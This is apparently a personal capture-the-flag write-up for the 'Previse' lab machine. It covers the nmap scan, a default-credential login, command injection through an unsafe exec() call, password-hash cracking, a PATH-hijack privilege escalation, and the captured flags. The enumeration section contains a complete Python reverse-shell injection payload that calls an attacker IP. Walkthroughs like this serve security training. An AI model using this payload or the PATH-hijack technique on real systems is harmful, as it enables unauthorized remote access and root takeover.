# Previse	

## nmap
```
Nmap 7.92 scan initiated Fri Nov 26 06:43:28 2021 as: nmap -A -T4 -p- -oN nmap/fullscan 10.10.11.104
Warning: 10.10.11.104 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.11.104
Host is up (0.16s latency).
Not shown: 65425 closed tcp ports (reset), 108 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 53:ed:44:40:11:6e:8b:da:69:85:79:c0:81:f2:3a:12 (RSA)
|   256 bc:54:20:ac:17:23:bb:50:20:f4:e1:6e:62:0f:01:b5 (ECDSA)
|_  256 33:c1:89:ea:59:73:b1:78:84:38:a4:21:10:0c:91:d8 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
| http-title: Previse Login
|_Requested resource was login.php
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

## Enumeration
### gobuster
![](https://i.imgur.com/jm5Ya4R.png)

### Website enum
- Try default creds `admin:admin` which works
- Download site log
- Download sitebackup 


- When downloading log details, the python script uses the unsafe exec() when parsing user input
- We can abuse this by adding onto the script with our python reverse shell after te delimiter. Rememeber to URL encode the reverse shell payload. 
`comma;python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.108",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`


## Foothold
- Login to mysql with username found `root:mySQL_p@ssw0rd!:)` with `mysql -u root -p previse`
- Run `select * from accounts`
- Retrieve hash: `$1$🧂llol$DQpmdvnb7EeuO6UaqRItf.`
- Crack hash: `john --format=md5crypt-long --wordlist=/usr/share/wordlists/rockyou.txt hash`
- Password for m4lwhere is `ilovecody112235!`
- Ssh to m4lwhere account and retrieve user.txt `9c669a509276942ef1ba01a1c7dbe021`


## Priv esc
![](https://i.imgur.com/0cHKq0b.png)
- Create gzip script in /tmp which is a bash reverse shell to attacker machine
- Start listener
- export gzip to path `export PATH=/tmp:$PATH`
- Run `sudo /opt/scripts/access_backup.sh`
- We are root
- cat /root/root.txt `392e809c5e419e39440f12c2bfe46bd0`